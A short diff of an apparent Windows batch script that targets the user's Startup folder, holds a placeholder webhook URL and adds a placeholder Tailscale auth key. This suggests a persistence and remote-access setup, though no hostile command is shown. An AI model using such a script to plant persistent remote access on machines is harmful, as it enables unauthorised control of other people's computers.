@@ -7,6 +7,7 @@
 set "INITIALPATH=%cd%"
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 set "WEBHOOK=YOUR_WEBHOOK_LINK"
+set "AUTHKEY=YOUR_TAILSCALE_KEY"
 
 @REM move into Startup Dir
 cd "%STARTUP%"
